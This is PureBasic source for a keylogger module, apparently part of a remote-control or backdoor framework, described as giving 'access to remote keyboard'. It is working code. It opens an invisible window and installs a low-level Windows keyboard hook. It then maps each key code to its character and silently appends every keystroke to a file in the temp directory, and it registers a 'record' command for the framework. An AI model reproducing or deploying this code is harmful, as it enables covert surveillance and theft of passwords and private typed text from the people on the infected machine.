#MODULE_ACCESS = 1
#MODULE_DESC = "Provides support for accessing remote keyboard"

XIncludeFile("../include/framework.pbi")

Structure KBDLLHOOKSTRUCT
	vkCode.l
	ScanCode.l
	Flags.l
	Time.l
	dwExtraInfo.l
EndStructure

Global File$ =GetTemporaryDirectory() + "\keydata"
Global Active.l


Procedure WriteScan(FilePath$, String$)
	Define Handle.l
	If (FileSize(FilePath$) = -1)
		Handle = CreateFile(#PB_Any, FilePath$)
		FileSeek(Handle, Lof(Handle))
	Else
		Handle = OpenFile(#PB_Any, FilePath$)
	EndIf
	If Handle
		FileSeek(Handle, Lof(Handle))
		WriteString(Handle, String$)
		CloseFile(Handle)
	EndIf
EndProcedure 

Procedure GetKeyboardLayout(hWnd.l)
	Define Pid.l
	Pid = GetWindowThreadProcessId_(hWnd, 0)
	If Pid
		Select ValD(Hex(GetKeyboardLayout_(Pid), #PB_Word))
			Case 409
				ProcedureReturn 1
			Case 419
				ProcedureReturn 2
		EndSelect
	EndIf 
	ProcedureReturn 0
EndProcedure

Procedure.s GetKeyName(vkCode, Type.l, Lang.l)
	Define Key$ = "27;112;113;114;115;116;117;118;119;120;121;122;123;44;19;45;46;192;49;50;51;52;53;54;55;56;57;48;189;187;8;"
	Key$ + "9;81;87;69;82;84;89;85;73;79;80;219;221;220;20;65;83;68;70;71;72;74;75;76;186;222;13;"
	Key$ + "90;88;67;86;66;78;77;188;190;191;91;32;37;38;40;39"
	Define LEng$ = "{ESC};{F1};{F2};{F3};{F4};{F5};{F6};{F7};{F8};{F9};{F10};{F11};{F12};{PrtSc/SysRq};{Pause/Break};{Ins};{Del};"
	LEng$ + "`;1;2;3;4;5;6;7;8;9;0;-;=;{Backspace};{Tab};q;w;e;r;t;y;u;i;o;p;[;];\;{Caps Lock};a;s;d;f;g;h;j;k;l;{Semicolon};';<br/>;"
	LEng$ + "z;x;c;v;b;n;m;,;.;/;{Win}; ;{Left};{Up};{Down};{Right}"
	Define UEng$ = "{ESC};{F1};{F2};{F3};{F4};{F5};{F6};{F7};{F8};{F9};{F10};{F11};{F12};{PrtSc/SysRq};{Pause/Break};{Ins};{Del};"
	UEng$ + "~;!;@;#;$;%;^;&;*;(;);_;+;{Backspace};{Tab};Q;W;E;R;T;Y;U;I;O;P;{;};/;{Caps Lock};A;S;D;F;G;H;J;K;L;:;" + Chr(34) + ";<br/>;"
	UEng$ + "Z;X;C;V;B;N;M;<;>;?;{Win}; ;{Left};{Up};{Down};{Right}"
	For i = 1 To 74
		If (Val(StringField(Key$, i, ";")) = vkCode)
			Select Type
				Case 0
					Select Lang
						Case 1
							ProcedureReturn StringField(LEng$, i, ";")
					EndSelect
				Case 1
					Select Lang
						Case 1
							ProcedureReturn StringField(UEng$, i, ";")
					EndSelect
			EndSelect     
		EndIf 
	Next 
	ProcedureReturn ""
EndProcedure

Procedure KeyboardHook(iCode, wParam, *hook.KBDLLHOOKSTRUCT)
	Define hWnd = GetForegroundWindow_()
	If (wParam = 256)
		If ((*hook\vkCode <> 160) And (*hook\vkCode <> 161) And (*hook\vkCode <> 162) And (*hook\vkCode <> 163))
			If (GetAsyncKeyState_(#VK_LSHIFT) Or GetAsyncKeyState_(#VK_RSHIFT))
				WriteScan(File$, GetKeyName(*hook\vkCode, 1, GetKeyboardLayout(hWnd)))
			Else
				WriteScan(File$, GetKeyName(*hook\vkCode, 0, GetKeyboardLayout(hWnd)))
			EndIf
		EndIf
	EndIf
	ProcedureReturn CallNextHookEx_(0, iCode, wParam, *hook)
EndProcedure 




Procedure record()
	send_fdbm("Recording keystrokes at ~\keydata")
	If OpenWindow(0, -200, -200, 100, 100, "", #PB_Window_Invisible)
		Hook = SetWindowsHookEx_(#WH_KEYBOARD_LL, @KeyboardHook(), GetModuleHandle_(0), 0)
		If (Not Hook)
			End
		EndIf
		Repeat
			Select WaitWindowEvent()
				Case #PB_Event_CloseWindow
					UnhookWindowsHookEx_(Hook)
					End
			EndSelect   
		ForEver
	EndIf
EndProcedure


DefineFunction("record",@record(),"void","Starts recording keystrokes to a file (needs kill to stop)")




DefineFunction("?",@man(),"void","Displays info about this command")
send_fdbm("<span style='color:red'>Unknown function: <b> "+com(1)+"</b></span>")
; IDE Options = PureBasic 5.00 (Windows - x86)
; EnableXP
; Executable = kb.exe
; EnabledTools = H5_MODULE_COMPILER